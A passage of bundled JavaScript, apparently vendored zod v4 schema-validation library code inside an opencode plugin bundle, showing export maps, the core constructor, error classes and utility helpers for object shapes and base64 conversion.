  _function: () => _function2,
  _default: () => _default4,
  _ZodString: () => _ZodString2,
  ZodXID: () => ZodXID2,
  ZodVoid: () => ZodVoid2,
  ZodUnknown: () => ZodUnknown2,
  ZodUnion: () => ZodUnion2,
  ZodUndefined: () => ZodUndefined2,
  ZodUUID: () => ZodUUID2,
  ZodURL: () => ZodURL2,
  ZodULID: () => ZodULID2,
  ZodType: () => ZodType2,
  ZodTuple: () => ZodTuple2,
  ZodTransform: () => ZodTransform2,
  ZodTemplateLiteral: () => ZodTemplateLiteral2,
  ZodSymbol: () => ZodSymbol2,
  ZodSuccess: () => ZodSuccess2,
  ZodStringFormat: () => ZodStringFormat2,
  ZodString: () => ZodString2,
  ZodSet: () => ZodSet2,
  ZodRecord: () => ZodRecord2,
  ZodRealError: () => ZodRealError2,
  ZodReadonly: () => ZodReadonly2,
  ZodPromise: () => ZodPromise2,
  ZodPrefault: () => ZodPrefault2,
  ZodPipe: () => ZodPipe2,
  ZodOptional: () => ZodOptional2,
  ZodObject: () => ZodObject2,
  ZodNumberFormat: () => ZodNumberFormat2,
  ZodNumber: () => ZodNumber2,
  ZodNullable: () => ZodNullable2,
  ZodNull: () => ZodNull2,
  ZodNonOptional: () => ZodNonOptional2,
  ZodNever: () => ZodNever2,
  ZodNanoID: () => ZodNanoID2,
  ZodNaN: () => ZodNaN2,
  ZodMap: () => ZodMap2,
  ZodLiteral: () => ZodLiteral2,
  ZodLazy: () => ZodLazy2,
  ZodKSUID: () => ZodKSUID2,
  ZodJWT: () => ZodJWT2,
  ZodIssueCode: () => ZodIssueCode2,
  ZodIntersection: () => ZodIntersection2,
  ZodISOTime: () => ZodISOTime2,
  ZodISODuration: () => ZodISODuration2,
  ZodISODateTime: () => ZodISODateTime2,
  ZodISODate: () => ZodISODate2,
  ZodIPv6: () => ZodIPv62,
  ZodIPv4: () => ZodIPv42,
  ZodGUID: () => ZodGUID2,
  ZodFunction: () => ZodFunction2,
  ZodFirstPartyTypeKind: () => ZodFirstPartyTypeKind2,
  ZodFile: () => ZodFile2,
  ZodError: () => ZodError2,
  ZodEnum: () => ZodEnum2,
  ZodEmoji: () => ZodEmoji2,
  ZodEmail: () => ZodEmail2,
  ZodE164: () => ZodE1642,
  ZodDiscriminatedUnion: () => ZodDiscriminatedUnion2,
  ZodDefault: () => ZodDefault2,
  ZodDate: () => ZodDate2,
  ZodCustomStringFormat: () => ZodCustomStringFormat2,
  ZodCustom: () => ZodCustom2,
  ZodCodec: () => ZodCodec2,
  ZodCatch: () => ZodCatch2,
  ZodCUID2: () => ZodCUID22,
  ZodCUID: () => ZodCUID3,
  ZodCIDRv6: () => ZodCIDRv62,
  ZodCIDRv4: () => ZodCIDRv42,
  ZodBoolean: () => ZodBoolean2,
  ZodBigIntFormat: () => ZodBigIntFormat2,
  ZodBigInt: () => ZodBigInt2,
  ZodBase64URL: () => ZodBase64URL2,
  ZodBase64: () => ZodBase642,
  ZodArray: () => ZodArray2,
  ZodAny: () => ZodAny2,
  TimePrecision: () => TimePrecision2,
  NEVER: () => NEVER2,
  $output: () => $output2,
  $input: () => $input2,
  $brand: () => $brand2
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/index.js
var exports_core4 = {};
__export(exports_core4, {
  version: () => version2,
  util: () => exports_util2,
  treeifyError: () => treeifyError2,
  toJSONSchema: () => toJSONSchema2,
  toDotPath: () => toDotPath2,
  safeParseAsync: () => safeParseAsync3,
  safeParse: () => safeParse3,
  safeEncodeAsync: () => safeEncodeAsync3,
  safeEncode: () => safeEncode3,
  safeDecodeAsync: () => safeDecodeAsync3,
  safeDecode: () => safeDecode3,
  registry: () => registry2,
  regexes: () => exports_regexes2,
  prettifyError: () => prettifyError2,
  parseAsync: () => parseAsync3,
  parse: () => parse5,
  locales: () => exports_locales2,
  isValidJWT: () => isValidJWT2,
  isValidBase64URL: () => isValidBase64URL2,
  isValidBase64: () => isValidBase642,
  globalRegistry: () => globalRegistry2,
  globalConfig: () => globalConfig2,
  formatError: () => formatError2,
  flattenError: () => flattenError2,
  encodeAsync: () => encodeAsync3,
  encode: () => encode3,
  decodeAsync: () => decodeAsync3,
  decode: () => decode3,
  config: () => config2,
  clone: () => clone2,
  _xid: () => _xid2,
  _void: () => _void3,
  _uuidv7: () => _uuidv72,
  _uuidv6: () => _uuidv62,
  _uuidv4: () => _uuidv42,
  _uuid: () => _uuid2,
  _url: () => _url2,
  _uppercase: () => _uppercase2,
  _unknown: () => _unknown2,
  _union: () => _union2,
  _undefined: () => _undefined5,
  _ulid: () => _ulid2,
  _uint64: () => _uint642,
  _uint32: () => _uint322,
  _tuple: () => _tuple2,
  _trim: () => _trim2,
  _transform: () => _transform2,
  _toUpperCase: () => _toUpperCase2,
  _toLowerCase: () => _toLowerCase2,
  _templateLiteral: () => _templateLiteral2,
  _symbol: () => _symbol2,
  _superRefine: () => _superRefine2,
  _success: () => _success2,
  _stringbool: () => _stringbool2,
  _stringFormat: () => _stringFormat2,
  _string: () => _string2,
  _startsWith: () => _startsWith2,
  _size: () => _size2,
  _set: () => _set2,
  _safeParseAsync: () => _safeParseAsync2,
  _safeParse: () => _safeParse2,
  _safeEncodeAsync: () => _safeEncodeAsync2,
  _safeEncode: () => _safeEncode2,
  _safeDecodeAsync: () => _safeDecodeAsync2,
  _safeDecode: () => _safeDecode2,
  _regex: () => _regex2,
  _refine: () => _refine2,
  _record: () => _record2,
  _readonly: () => _readonly2,
  _property: () => _property2,
  _promise: () => _promise2,
  _positive: () => _positive2,
  _pipe: () => _pipe2,
  _parseAsync: () => _parseAsync2,
  _parse: () => _parse2,
  _overwrite: () => _overwrite2,
  _optional: () => _optional2,
  _number: () => _number2,
  _nullable: () => _nullable2,
  _null: () => _null5,
  _normalize: () => _normalize2,
  _nonpositive: () => _nonpositive2,
  _nonoptional: () => _nonoptional2,
  _nonnegative: () => _nonnegative2,
  _never: () => _never2,
  _negative: () => _negative2,
  _nativeEnum: () => _nativeEnum2,
  _nanoid: () => _nanoid2,
  _nan: () => _nan2,
  _multipleOf: () => _multipleOf2,
  _minSize: () => _minSize2,
  _minLength: () => _minLength2,
  _min: () => _gte2,
  _mime: () => _mime2,
  _maxSize: () => _maxSize2,
  _maxLength: () => _maxLength2,
  _max: () => _lte2,
  _map: () => _map2,
  _lte: () => _lte2,
  _lt: () => _lt2,
  _lowercase: () => _lowercase2,
  _literal: () => _literal2,
  _length: () => _length2,
  _lazy: () => _lazy2,
  _ksuid: () => _ksuid2,
  _jwt: () => _jwt2,
  _isoTime: () => _isoTime2,
  _isoDuration: () => _isoDuration2,
  _isoDateTime: () => _isoDateTime2,
  _isoDate: () => _isoDate2,
  _ipv6: () => _ipv62,
  _ipv4: () => _ipv42,
  _intersection: () => _intersection2,
  _int64: () => _int642,
  _int32: () => _int322,
  _int: () => _int2,
  _includes: () => _includes2,
  _guid: () => _guid2,
  _gte: () => _gte2,
  _gt: () => _gt2,
  _float64: () => _float642,
  _float32: () => _float322,
  _file: () => _file2,
  _enum: () => _enum3,
  _endsWith: () => _endsWith2,
  _encodeAsync: () => _encodeAsync2,
  _encode: () => _encode2,
  _emoji: () => _emoji4,
  _email: () => _email2,
  _e164: () => _e1642,
  _discriminatedUnion: () => _discriminatedUnion2,
  _default: () => _default3,
  _decodeAsync: () => _decodeAsync2,
  _decode: () => _decode2,
  _date: () => _date2,
  _custom: () => _custom2,
  _cuid2: () => _cuid22,
  _cuid: () => _cuid3,
  _coercedString: () => _coercedString2,
  _coercedNumber: () => _coercedNumber2,
  _coercedDate: () => _coercedDate2,
  _coercedBoolean: () => _coercedBoolean2,
  _coercedBigint: () => _coercedBigint2,
  _cidrv6: () => _cidrv62,
  _cidrv4: () => _cidrv42,
  _check: () => _check2,
  _catch: () => _catch3,
  _boolean: () => _boolean2,
  _bigint: () => _bigint2,
  _base64url: () => _base64url2,
  _base64: () => _base642,
  _array: () => _array2,
  _any: () => _any2,
  TimePrecision: () => TimePrecision2,
  NEVER: () => NEVER2,
  JSONSchemaGenerator: () => JSONSchemaGenerator2,
  JSONSchema: () => exports_json_schema2,
  Doc: () => Doc2,
  $output: () => $output2,
  $input: () => $input2,
  $constructor: () => $constructor2,
  $brand: () => $brand2,
  $ZodXID: () => $ZodXID2,
  $ZodVoid: () => $ZodVoid2,
  $ZodUnknown: () => $ZodUnknown2,
  $ZodUnion: () => $ZodUnion2,
  $ZodUndefined: () => $ZodUndefined2,
  $ZodUUID: () => $ZodUUID2,
  $ZodURL: () => $ZodURL2,
  $ZodULID: () => $ZodULID2,
  $ZodType: () => $ZodType2,
  $ZodTuple: () => $ZodTuple2,
  $ZodTransform: () => $ZodTransform2,
  $ZodTemplateLiteral: () => $ZodTemplateLiteral2,
  $ZodSymbol: () => $ZodSymbol2,
  $ZodSuccess: () => $ZodSuccess2,
  $ZodStringFormat: () => $ZodStringFormat2,
  $ZodString: () => $ZodString2,
  $ZodSet: () => $ZodSet2,
  $ZodRegistry: () => $ZodRegistry2,
  $ZodRecord: () => $ZodRecord2,
  $ZodRealError: () => $ZodRealError2,
  $ZodReadonly: () => $ZodReadonly2,
  $ZodPromise: () => $ZodPromise2,
  $ZodPrefault: () => $ZodPrefault2,
  $ZodPipe: () => $ZodPipe2,
  $ZodOptional: () => $ZodOptional2,
  $ZodObjectJIT: () => $ZodObjectJIT2,
  $ZodObject: () => $ZodObject2,
  $ZodNumberFormat: () => $ZodNumberFormat2,
  $ZodNumber: () => $ZodNumber2,
  $ZodNullable: () => $ZodNullable2,
  $ZodNull: () => $ZodNull2,
  $ZodNonOptional: () => $ZodNonOptional2,
  $ZodNever: () => $ZodNever2,
  $ZodNanoID: () => $ZodNanoID2,
  $ZodNaN: () => $ZodNaN2,
  $ZodMap: () => $ZodMap2,
  $ZodLiteral: () => $ZodLiteral2,
  $ZodLazy: () => $ZodLazy2,
  $ZodKSUID: () => $ZodKSUID2,
  $ZodJWT: () => $ZodJWT2,
  $ZodIntersection: () => $ZodIntersection2,
  $ZodISOTime: () => $ZodISOTime2,
  $ZodISODuration: () => $ZodISODuration2,
  $ZodISODateTime: () => $ZodISODateTime2,
  $ZodISODate: () => $ZodISODate2,
  $ZodIPv6: () => $ZodIPv62,
  $ZodIPv4: () => $ZodIPv42,
  $ZodGUID: () => $ZodGUID2,
  $ZodFunction: () => $ZodFunction2,
  $ZodFile: () => $ZodFile2,
  $ZodError: () => $ZodError2,
  $ZodEnum: () => $ZodEnum2,
  $ZodEncodeError: () => $ZodEncodeError2,
  $ZodEmoji: () => $ZodEmoji2,
  $ZodEmail: () => $ZodEmail2,
  $ZodE164: () => $ZodE1642,
  $ZodDiscriminatedUnion: () => $ZodDiscriminatedUnion2,
  $ZodDefault: () => $ZodDefault2,
  $ZodDate: () => $ZodDate2,
  $ZodCustomStringFormat: () => $ZodCustomStringFormat2,
  $ZodCustom: () => $ZodCustom2,
  $ZodCodec: () => $ZodCodec2,
  $ZodCheckUpperCase: () => $ZodCheckUpperCase2,
  $ZodCheckStringFormat: () => $ZodCheckStringFormat2,
  $ZodCheckStartsWith: () => $ZodCheckStartsWith2,
  $ZodCheckSizeEquals: () => $ZodCheckSizeEquals2,
  $ZodCheckRegex: () => $ZodCheckRegex2,
  $ZodCheckProperty: () => $ZodCheckProperty2,
  $ZodCheckOverwrite: () => $ZodCheckOverwrite2,
  $ZodCheckNumberFormat: () => $ZodCheckNumberFormat2,
  $ZodCheckMultipleOf: () => $ZodCheckMultipleOf2,
  $ZodCheckMinSize: () => $ZodCheckMinSize2,
  $ZodCheckMinLength: () => $ZodCheckMinLength2,
  $ZodCheckMimeType: () => $ZodCheckMimeType2,
  $ZodCheckMaxSize: () => $ZodCheckMaxSize2,
  $ZodCheckMaxLength: () => $ZodCheckMaxLength2,
  $ZodCheckLowerCase: () => $ZodCheckLowerCase2,
  $ZodCheckLessThan: () => $ZodCheckLessThan2,
  $ZodCheckLengthEquals: () => $ZodCheckLengthEquals2,
  $ZodCheckIncludes: () => $ZodCheckIncludes2,
  $ZodCheckGreaterThan: () => $ZodCheckGreaterThan2,
  $ZodCheckEndsWith: () => $ZodCheckEndsWith2,
  $ZodCheckBigIntFormat: () => $ZodCheckBigIntFormat2,
  $ZodCheck: () => $ZodCheck2,
  $ZodCatch: () => $ZodCatch2,
  $ZodCUID2: () => $ZodCUID22,
  $ZodCUID: () => $ZodCUID3,
  $ZodCIDRv6: () => $ZodCIDRv62,
  $ZodCIDRv4: () => $ZodCIDRv42,
  $ZodBoolean: () => $ZodBoolean2,
  $ZodBigIntFormat: () => $ZodBigIntFormat2,
  $ZodBigInt: () => $ZodBigInt2,
  $ZodBase64URL: () => $ZodBase64URL2,
  $ZodBase64: () => $ZodBase642,
  $ZodAsyncError: () => $ZodAsyncError2,
  $ZodArray: () => $ZodArray2,
  $ZodAny: () => $ZodAny2
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/core.js
var NEVER2 = Object.freeze({
  status: "aborted"
});
function $constructor2(name, initializer3, params) {
  function init(inst, def) {
    var _a2;
    Object.defineProperty(inst, "_zod", {
      value: inst._zod ?? {},
      enumerable: false
    });
    (_a2 = inst._zod).traits ?? (_a2.traits = new Set);
    inst._zod.traits.add(name);
    initializer3(inst, def);
    for (const k in _.prototype) {
      if (!(k in inst))
        Object.defineProperty(inst, k, { value: _.prototype[k].bind(inst) });
    }
    inst._zod.constr = _;
    inst._zod.def = def;
  }
  const Parent = params?.Parent ?? Object;

  class Definition extends Parent {
  }
  Object.defineProperty(Definition, "name", { value: name });
  function _(def) {
    var _a2;
    const inst = params?.Parent ? new Definition : this;
    init(inst, def);
    (_a2 = inst._zod).deferred ?? (_a2.deferred = []);
    for (const fn of inst._zod.deferred) {
      fn();
    }
    return inst;
  }
  Object.defineProperty(_, "init", { value: init });
  Object.defineProperty(_, Symbol.hasInstance, {
    value: (inst) => {
      if (params?.Parent && inst instanceof params.Parent)
        return true;
      return inst?._zod?.traits?.has(name);
    }
  });
  Object.defineProperty(_, "name", { value: name });
  return _;
}
var $brand2 = Symbol("zod_brand");

class $ZodAsyncError2 extends Error {
  constructor() {
    super(`Encountered Promise during synchronous parse. Use .parseAsync() instead.`);
  }
}

class $ZodEncodeError2 extends Error {
  constructor(name) {
    super(`Encountered unidirectional transform during encode: ${name}`);
    this.name = "ZodEncodeError";
  }
}
var globalConfig2 = {};
function config2(newConfig) {
  if (newConfig)
    Object.assign(globalConfig2, newConfig);
  return globalConfig2;
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/util.js
var exports_util2 = {};
__export(exports_util2, {
  unwrapMessage: () => unwrapMessage2,
  uint8ArrayToHex: () => uint8ArrayToHex2,
  uint8ArrayToBase64url: () => uint8ArrayToBase64url2,
  uint8ArrayToBase64: () => uint8ArrayToBase642,
  stringifyPrimitive: () => stringifyPrimitive2,
  shallowClone: () => shallowClone2,
  safeExtend: () => safeExtend2,
  required: () => required2,
  randomString: () => randomString2,
  propertyKeyTypes: () => propertyKeyTypes2,
  promiseAllObject: () => promiseAllObject2,
  primitiveTypes: () => primitiveTypes2,
  prefixIssues: () => prefixIssues2,
  pick: () => pick2,
  partial: () => partial2,
  optionalKeys: () => optionalKeys2,
  omit: () => omit2,
  objectClone: () => objectClone2,
  numKeys: () => numKeys2,
  nullish: () => nullish3,
  normalizeParams: () => normalizeParams2,
  mergeDefs: () => mergeDefs2,
  merge: () => merge2,
  jsonStringifyReplacer: () => jsonStringifyReplacer2,
  joinValues: () => joinValues2,
  issue: () => issue2,
  isPlainObject: () => isPlainObject2,
  isObject: () => isObject2,
  hexToUint8Array: () => hexToUint8Array2,
  getSizableOrigin: () => getSizableOrigin2,
  getParsedType: () => getParsedType2,
  getLengthableOrigin: () => getLengthableOrigin2,
  getEnumValues: () => getEnumValues2,
  getElementAtPath: () => getElementAtPath2,
  floatSafeRemainder: () => floatSafeRemainder2,
  finalizeIssue: () => finalizeIssue2,
  extend: () => extend2,
  escapeRegex: () => escapeRegex2,
  esc: () => esc2,
  defineLazy: () => defineLazy2,
  createTransparentProxy: () => createTransparentProxy2,
  cloneDef: () => cloneDef2,
  clone: () => clone2,
  cleanRegex: () => cleanRegex2,
  cleanEnum: () => cleanEnum2,
  captureStackTrace: () => captureStackTrace2,
  cached: () => cached2,
  base64urlToUint8Array: () => base64urlToUint8Array2,
  base64ToUint8Array: () => base64ToUint8Array2,
  assignProp: () => assignProp2,
  assertNotEqual: () => assertNotEqual2,
  assertNever: () => assertNever2,
  assertIs: () => assertIs2,
  assertEqual: () => assertEqual2,
  assert: () => assert2,
  allowsEval: () => allowsEval2,
  aborted: () => aborted2,
  NUMBER_FORMAT_RANGES: () => NUMBER_FORMAT_RANGES2,
  Class: () => Class2,
  BIGINT_FORMAT_RANGES: () => BIGINT_FORMAT_RANGES2
});
function assertEqual2(val) {
  return val;
}
function assertNotEqual2(val) {
  return val;
}
function assertIs2(_arg) {}
function assertNever2(_x) {
  throw new Error;
}
function assert2(_) {}
function getEnumValues2(entries) {
  const numericValues = Object.values(entries).filter((v) => typeof v === "number");
  const values = Object.entries(entries).filter(([k, _]) => numericValues.indexOf(+k) === -1).map(([_, v]) => v);
  return values;
}
function joinValues2(array2, separator = "|") {
  return array2.map((val) => stringifyPrimitive2(val)).join(separator);
}
function jsonStringifyReplacer2(_, value) {
  if (typeof value === "bigint")
    return value.toString();
  return value;
}
function cached2(getter) {
  const set2 = false;
  return {
    get value() {
      if (!set2) {
        const value = getter();
        Object.defineProperty(this, "value", { value });
        return value;
      }
      throw new Error("cached value already set");
    }
  };
}
function nullish3(input) {
  return input === null || input === undefined;
}
function cleanRegex2(source) {
  const start = source.startsWith("^") ? 1 : 0;
  const end = source.endsWith("$") ? source.length - 1 : source.length;
  return source.slice(start, end);
}
function floatSafeRemainder2(val, step) {
  const valDecCount = (val.toString().split(".")[1] || "").length;
  const stepString = step.toString();
  let stepDecCount = (stepString.split(".")[1] || "").length;
  if (stepDecCount === 0 && /\d?e-\d?/.test(stepString)) {
    const match = stepString.match(/\d?e-(\d?)/);
    if (match?.[1]) {
      stepDecCount = Number.parseInt(match[1]);
    }
  }
  const decCount = valDecCount > stepDecCount ? valDecCount : stepDecCount;
  const valInt = Number.parseInt(val.toFixed(decCount).replace(".", ""));
  const stepInt = Number.parseInt(step.toFixed(decCount).replace(".", ""));
  return valInt % stepInt / 10 ** decCount;
}
var EVALUATING2 = Symbol("evaluating");
function defineLazy2(object2, key, getter) {
  let value = undefined;
  Object.defineProperty(object2, key, {
    get() {
      if (value === EVALUATING2) {
        return;
      }
      if (value === undefined) {
        value = EVALUATING2;
        value = getter();
      }
      return value;
    },
    set(v) {
      Object.defineProperty(object2, key, {
        value: v
      });
    },
    configurable: true
  });
}
function objectClone2(obj) {
  return Object.create(Object.getPrototypeOf(obj), Object.getOwnPropertyDescriptors(obj));
}
function assignProp2(target, prop, value) {
  Object.defineProperty(target, prop, {
    value,
    writable: true,
    enumerable: true,
    configurable: true
  });
}
function mergeDefs2(...defs) {
  const mergedDescriptors = {};
  for (const def of defs) {
    const descriptors = Object.getOwnPropertyDescriptors(def);
    Object.assign(mergedDescriptors, descriptors);
  }
  return Object.defineProperties({}, mergedDescriptors);
}
function cloneDef2(schema) {
  return mergeDefs2(schema._zod.def);
}
function getElementAtPath2(obj, path) {
  if (!path)
    return obj;
  return path.reduce((acc, key) => acc?.[key], obj);
}
function promiseAllObject2(promisesObj) {
  const keys = Object.keys(promisesObj);
  const promises = keys.map((key) => promisesObj[key]);
  return Promise.all(promises).then((results) => {
    const resolvedObj = {};
    for (let i = 0;i < keys.length; i++) {
      resolvedObj[keys[i]] = results[i];
    }
    return resolvedObj;
  });
}
function randomString2(length = 10) {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  let str = "";
  for (let i = 0;i < length; i++) {
    str += chars[Math.floor(Math.random() * chars.length)];
  }
  return str;
}
function esc2(str) {
  return JSON.stringify(str);
}
var captureStackTrace2 = "captureStackTrace" in Error ? Error.captureStackTrace : (..._args) => {};
function isObject2(data) {
  return typeof data === "object" && data !== null && !Array.isArray(data);
}
var allowsEval2 = cached2(() => {
  if (typeof navigator !== "undefined" && navigator?.userAgent?.includes("Cloudflare")) {
    return false;
  }
  try {
    const F = Function;
    new F("");
    return true;
  } catch (_) {
    return false;
  }
});
function isPlainObject2(o) {
  if (isObject2(o) === false)
    return false;
  const ctor = o.constructor;
  if (ctor === undefined)
    return true;
  const prot = ctor.prototype;
  if (isObject2(prot) === false)
    return false;
  if (Object.prototype.hasOwnProperty.call(prot, "isPrototypeOf") === false) {
    return false;
  }
  return true;
}
function shallowClone2(o) {
  if (isPlainObject2(o))
    return { ...o };
  if (Array.isArray(o))
    return [...o];
  return o;
}
function numKeys2(data) {
  let keyCount = 0;
  for (const key in data) {
    if (Object.prototype.hasOwnProperty.call(data, key)) {
      keyCount++;
    }
  }
  return keyCount;
}
var getParsedType2 = (data) => {
  const t = typeof data;
  switch (t) {
    case "undefined":
      return "undefined";
    case "string":
      return "string";
    case "number":
      return Number.isNaN(data) ? "nan" : "number";
    case "boolean":
      return "boolean";
    case "function":
      return "function";
    case "bigint":
      return "bigint";
    case "symbol":
      return "symbol";
    case "object":
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (data.then && typeof data.then === "function" && data.catch && typeof data.catch === "function") {
        return "promise";
      }
      if (typeof Map !== "undefined" && data instanceof Map) {
        return "map";
      }
      if (typeof Set !== "undefined" && data instanceof Set) {
        return "set";
      }
      if (typeof Date !== "undefined" && data instanceof Date) {
        return "date";
      }
      if (typeof File !== "undefined" && data instanceof File) {
        return "file";
      }
      return "object";
    default:
      throw new Error(`Unknown data type: ${t}`);
  }
};
var propertyKeyTypes2 = new Set(["string", "number", "symbol"]);
var primitiveTypes2 = new Set(["string", "number", "bigint", "boolean", "symbol", "undefined"]);
function escapeRegex2(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
function clone2(inst, def, params) {
  const cl = new inst._zod.constr(def ?? inst._zod.def);
  if (!def || params?.parent)
    cl._zod.parent = inst;
  return cl;
}
function normalizeParams2(_params) {
  const params = _params;
  if (!params)
    return {};
  if (typeof params === "string")
    return { error: () => params };
  if (params?.message !== undefined) {
    if (params?.error !== undefined)
      throw new Error("Cannot specify both `message` and `error` params");
    params.error = params.message;
  }
  delete params.message;
  if (typeof params.error === "string")
    return { ...params, error: () => params.error };
  return params;
}
function createTransparentProxy2(getter) {
  let target;
  return new Proxy({}, {
    get(_, prop, receiver) {
      target ?? (target = getter());
      return Reflect.get(target, prop, receiver);
    },
    set(_, prop, value, receiver) {
      target ?? (target = getter());
      return Reflect.set(target, prop, value, receiver);
    },
    has(_, prop) {
      target ?? (target = getter());
      return Reflect.has(target, prop);
    },
    deleteProperty(_, prop) {
      target ?? (target = getter());
      return Reflect.deleteProperty(target, prop);
    },
    ownKeys(_) {
      target ?? (target = getter());
      return Reflect.ownKeys(target);
    },
    getOwnPropertyDescriptor(_, prop) {
      target ?? (target = getter());
      return Reflect.getOwnPropertyDescriptor(target, prop);
    },
    defineProperty(_, prop, descriptor) {
      target ?? (target = getter());
      return Reflect.defineProperty(target, prop, descriptor);
    }
  });
}
function stringifyPrimitive2(value) {
  if (typeof value === "bigint")
    return value.toString() + "n";
  if (typeof value === "string")
    return `"${value}"`;
  return `${value}`;
}
function optionalKeys2(shape) {
  return Object.keys(shape).filter((k) => {
    return shape[k]._zod.optin === "optional" && shape[k]._zod.optout === "optional";
  });
}
var NUMBER_FORMAT_RANGES2 = {
  safeint: [Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER],
  int32: [-2147483648, 2147483647],
  uint32: [0, 4294967295],
  float32: [-340282346638528860000000000000000000000, 340282346638528860000000000000000000000],
  float64: [-Number.MAX_VALUE, Number.MAX_VALUE]
};
var BIGINT_FORMAT_RANGES2 = {
  int64: [/* @__PURE__ */ BigInt("-9223372036854775808"), /* @__PURE__ */ BigInt("9223372036854775807")],
  uint64: [/* @__PURE__ */ BigInt(0), /* @__PURE__ */ BigInt("18446744073709551615")]
};
function pick2(schema, mask) {
  const currDef = schema._zod.def;
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const newShape = {};
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        newShape[key] = currDef.shape[key];
      }
      assignProp2(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function omit2(schema, mask) {
  const currDef = schema._zod.def;
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const newShape = { ...schema._zod.def.shape };
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        delete newShape[key];
      }
      assignProp2(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function extend2(schema, shape) {
  if (!isPlainObject2(shape)) {
    throw new Error("Invalid input to extend: expected a plain object");
  }
  const checks3 = schema._zod.def.checks;
  const hasChecks = checks3 && checks3.length > 0;
  if (hasChecks) {
    throw new Error("Object schemas containing refinements cannot be extended. Use `.safeExtend()` instead.");
  }
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp2(this, "shape", _shape);
      return _shape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function safeExtend2(schema, shape) {
  if (!isPlainObject2(shape)) {
    throw new Error("Invalid input to safeExtend: expected a plain object");
  }
  const def = {
    ...schema._zod.def,
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp2(this, "shape", _shape);
      return _shape;
    },
    checks: schema._zod.def.checks
  };
  return clone2(schema, def);
}
function merge2(a, b) {
  const def = mergeDefs2(a._zod.def, {
    get shape() {
      const _shape = { ...a._zod.def.shape, ...b._zod.def.shape };
      assignProp2(this, "shape", _shape);
      return _shape;
    },
    get catchall() {
      return b._zod.def.catchall;
    },
    checks: []
  });
  return clone2(a, def);
}
function partial2(Class2, schema, mask) {
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in oldShape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = Class2 ? new Class2({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      } else {
        for (const key in oldShape) {
          shape[key] = Class2 ? new Class2({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      }
      assignProp2(this, "shape", shape);
      return shape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function required2(Class2, schema, mask) {
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in shape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = new Class2({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      } else {
        for (const key in oldShape) {
          shape[key] = new Class2({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      }
      assignProp2(this, "shape", shape);
      return shape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function aborted2(x, startIndex = 0) {
  if (x.aborted === true)
    return true;
  for (let i = startIndex;i < x.issues.length; i++) {
    if (x.issues[i]?.continue !== true) {
      return true;
    }
  }
  return false;
}
function prefixIssues2(path, issues) {
  return issues.map((iss) => {
    var _a2;
    (_a2 = iss).path ?? (_a2.path = []);
    iss.path.unshift(path);
    return iss;
  });
}
function unwrapMessage2(message) {
  return typeof message === "string" ? message : message?.message;
}
function finalizeIssue2(iss, ctx, config3) {
  const full = { ...iss, path: iss.path ?? [] };
  if (!iss.message) {
    const message = unwrapMessage2(iss.inst?._zod.def?.error?.(iss)) ?? unwrapMessage2(ctx?.error?.(iss)) ?? unwrapMessage2(config3.customError?.(iss)) ?? unwrapMessage2(config3.localeError?.(iss)) ?? "Invalid input";
    full.message = message;
  }
  delete full.inst;
  delete full.continue;
  if (!ctx?.reportInput) {
    delete full.input;
  }
  return full;
}
function getSizableOrigin2(input) {
  if (input instanceof Set)
    return "set";
  if (input instanceof Map)
    return "map";
  if (input instanceof File)
    return "file";
  return "unknown";
}
function getLengthableOrigin2(input) {
  if (Array.isArray(input))
    return "array";
  if (typeof input === "string")
    return "string";
  return "unknown";
}
function issue2(...args) {
  const [iss, input, inst] = args;
  if (typeof iss === "string") {
    return {
      message: iss,
      code: "custom",
      input,
      inst
    };
  }
  return { ...iss };
}
function cleanEnum2(obj) {
  return Object.entries(obj).filter(([k, _]) => {
    return Number.isNaN(Number.parseInt(k, 10));
  }).map((el) => el[1]);
}
function base64ToUint8Array2(base643) {
  const binaryString = atob(base643);
  const bytes = new Uint8Array(binaryString.length);
  for (let i = 0;i < binaryString.length; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }
  return bytes;
}
function uint8ArrayToBase642(bytes) {
  let binaryString = "";
  for (let i = 0;i < bytes.length; i++) {
    binaryString += String.fromCharCode(bytes[i]);
  }
  return btoa(binaryString);
}
function base64urlToUint8Array2(base64url3) {
  const base643 = base64url3.replace(/-/g, "+").replace(/_/g, "/");
  const padding = "=".repeat((4 - base643.length % 4) % 4);
  return base64ToUint8Array2(base643 + padding);
}
function uint8ArrayToBase64url2(bytes) {
  return uint8ArrayToBase642(bytes).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}
function hexToUint8Array2(hex3) {
  const cleanHex = hex3.replace(/^0x/, "");
